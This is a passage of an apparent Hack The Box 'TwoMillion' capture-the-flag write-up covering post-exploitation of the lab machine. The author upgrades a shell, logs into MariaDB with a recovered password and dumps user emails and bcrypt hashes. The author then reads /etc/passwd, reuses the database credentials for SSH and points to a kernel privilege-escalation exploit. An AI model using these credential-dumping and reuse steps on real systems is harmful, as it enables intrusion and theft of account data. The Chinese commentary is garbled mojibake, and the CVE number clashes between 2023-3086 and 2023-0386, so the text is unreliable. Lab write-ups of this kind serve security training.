pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@2million:~/html$ mysql -u admin -p mysql -u admin -p Enter password: SuperDuperPass123 Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 334231 Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MariaDB [(none)]&gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | htb_prod | | information_schema | +--------------------+ 2 rows in set (0.001 sec) MariaDB [(none)]&gt; é€šè¿‡python3è·å–ä¸€ä¸ªäº¤äº’å¼æ›´å¼ºçš„shellï¼Œè¿æ¥mysqlæ•°æ®åº“ MariaDB [(none)]&gt; use htb_prod; use htb_prod; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [htb_prod]&gt; show tables; show tables; +--------------------+ | Tables_in_htb_prod | +--------------------+ | invite_codes | | users | +--------------------+ 2 rows in set (0.000 sec) MariaDB [htb_prod]&gt; select * from users; select * from users; +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | id | username | email | password | is_admin | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ | 11 | TRX | trx@hackthebox.eu | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq | 1 | | 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK | 1 | | 13 | admin1 | admin@test.org | $2y$10$qVCYOU26KpbHwZdKYQo2YOkthu2Lik9N7vrqZ4/NQoSPjObR0N20S | 1 | | 14 | shade1 | shade1@shade.com | $2y$10$rnJHveB0D9q6fJBtZLJ8/uy/uMI.qEicO6Lu5.k.I1talOCyPvywO | 1 | | 15 | razorrob123 | shopovrobert@gmail.com | $2y$10$KGOX6WLIrGJi9tgozKDLTeoG3v0EDGew4e0FBIJoDpqlKPwRM//Pq | 0 | | 16 | someb0dy | someb0dy@htb.com | $2y$10$SJPLEKKcBzP/G8dCxl0ADew14SzyKqSYw7/oloqYft8DTip//9BS6 | 1 | +----+--------------+----------------------------+--------------------------------------------------------------+----------+ 6 rows in set (0.000 sec) MariaDB [htb_prod]&gt; è¿™äº›æ•°æ®ä¼°è®¡æ˜¯å…¶ä»–ç©å®¶æ’å…¥çš„æ•°æ® æŸ¥çœ‹å¸¦shæƒé™çš„ç”¨æˆ· www-data@2million:~/html$ cat /etc/passwd | grep sh cat /etc/passwd | grep sh root:x:0:0:root:/root:/bin/bash www-data:x:33:33:www-data:/var/www:/bin/bash sshd:x:106:65534::/run/sshd:/usr/sbin/nologin fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin admin:x:1000:1000::/home/admin:/bin/bash å‘ç°adminå°±æ˜¯å¸¦shçš„ï¼Œç›´æ¥ç”¨æ•°æ®åº“çš„é…ç½®æ–‡ä»¶sshç™»å½•å°è¯• image.png Rootadmin@2million:/var/mail$ cat admin From: ch4p &lt;ch4p@2million.htb&gt; To: admin &lt;admin@2million.htb&gt; Cc: g0blin &lt;g0blin@2million.htb&gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: &lt;9876543210@2million.htb&gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I&#39;m know you&#39;re working as fast as you can to do the DB migration. While we&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;t get popped by that. HTB Godfather admin@2million:/var/mail$ è¿™é‡Œæœ‰ä¸€å°é‚®ä»¶,è¯´æœ‰ä¸€ä¸ªCVE CVE-2023-3086Refer:https://github.com/xkaneiki/CVE-2023-0386 image.png image.png image.png è¿™é‡Œè¿˜æœ‰ä¸€å°ç±»ä¼¼æ„Ÿè°¢ä¿¡çš„ä¸œè¥¿ {&quot;encryption&quot;: &quot;xor&quot;, &quot;encrpytion_key&quot;: &quot;HackTheBox&quot;, &quot;encoding&quot;: &quot;base64&quot;, &quot;data&quot;: &quot;DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA==&quot; image.png æ„Ÿè°¢ä¿¡Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here&#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team","categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}],"categories":[{"name":"HTB","slug":"HTB","permalink":"someb0dy.github.io/categories/HTB/"}],"tags":[{"name":"latexInject","slug":"latexInject","permalink":"someb0dy.github.io/tags/latexInject/"},{"name":"PostgreSqlInject,Write-SSH-Key","slug":"PostgreSqlInject-Write-SSH-Key","permalink":"someb0dy.github.io/tags/PostgreSqlInject-Write-SSH-Key/"},{"name":"JavaScript,RCE,CVE-2023-3086","slug":"JavaScript-RCE-CVE-2023-3086","permalink":"someb0dy.github.io/tags/JavaScript-RCE-CVE-2023-3086/"}]}